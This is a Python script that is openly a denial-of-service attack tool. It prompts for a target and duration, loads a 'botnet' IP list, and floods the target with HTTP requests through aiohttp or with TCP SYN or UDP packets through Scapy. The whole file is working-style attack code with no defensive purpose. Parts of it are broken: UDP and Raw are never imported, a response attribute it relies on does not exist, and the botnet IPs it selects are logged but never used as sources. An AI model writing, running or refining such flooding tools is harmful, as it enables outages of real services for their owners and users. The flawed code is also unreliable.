import aiohttp
import asyncio
import random
import time
import logging
from aiohttp import ClientSession, ClientTimeout

# Set up logging for response times and success rates
logging.basicConfig(level=logging.INFO)

# Load 50K IPs from a file
def load_ips(filename):
    with open(filename, "r") as f:
        return [line.strip() for line in f.readlines()]

# Load user agents from a file
def load_user_agents(filename="user_agents.txt"):
    with open(filename, "r") as f:
        return [line.strip() for line in f.readlines()]

# Load headers from a file
def load_headers(filename="headers.txt"):
    headers_list = []
    with open(filename, "r") as f:
        for line in f.readlines():
            key, value = line.strip().split(": ", 1)
            headers_list.append((key, value))
    return headers_list

# User input for attack settings
TARGET = input("Enter target URL/IP: ").strip()
PORT = int(input("Enter target port (80 for HTTP, 443 for HTTPS, etc.): ").strip())
ATTACK_TYPE = input("Choose attack type (HTTP/TCP/UDP): ").strip().upper()
DURATION = int(input("Enter attack duration in seconds: ").strip())

# Load IPs, user agents, and headers from files
IPS = load_ips("botnet_ips.txt")
USER_AGENTS = load_user_agents("user_agents.txt")
HEADERS_LIST = load_headers("headers.txt")

# Function to generate random headers
def get_random_headers():
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    for key, value in HEADERS_LIST:
        headers[key] = value
    return headers

# Measure and log server response time
async def measure_response(session, url, headers):
    try:
        async with session.get(url, headers=headers, timeout=1) as response:
            return response.status, response.elapsed.total_seconds()
    except Exception as e:
        logging.error(f"Error during request: {e}")
        return None, None

# HTTP Flood Attack using asyncio
async def http_flood():
    timeout = ClientTimeout(total=1)
    async with ClientSession(timeout=timeout) as session:
        headers = get_random_headers()
        while time.time() < END_TIME:
            status, response_time = await measure_response(session, TARGET, headers)
            if status:
                logging.info(f"HTTP Request to {TARGET} returned status {status} in {response_time:.2f}s")
            await asyncio.sleep(random.uniform(0.1, 1))  # Simulating real user behavior with delay

# (2) TCP SYN Flood Attack using Scapy (async method)
from scapy.all import IP, TCP, send

def tcp_flood():
    while time.time() < END_TIME:
        ip = random.choice(IPS)
        packet = IP(dst=TARGET) / TCP(dport=PORT, flags="S")
        send(packet, verbose=False)
        logging.info(f"Sent SYN packet to {TARGET} from {ip}")

# (3) UDP Flood Attack using Scapy
def udp_flood():
    while time.time() < END_TIME:
        ip = random.choice(IPS)
        packet = IP(dst=TARGET) / UDP(dport=PORT) / Raw(load=random._urandom(1024))
        send(packet, verbose=False)
        logging.info(f"Sent UDP packet to {TARGET} from {ip}")

# Determine attack method and run it
END_TIME = time.time() + DURATION
if ATTACK_TYPE == "HTTP":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(http_flood())  # Run HTTP flood with async

elif ATTACK_TYPE == "TCP":
    tcp_flood()  # Run TCP SYN flood

elif ATTACK_TYPE == "UDP":
    udp_flood()  # Run UDP flood

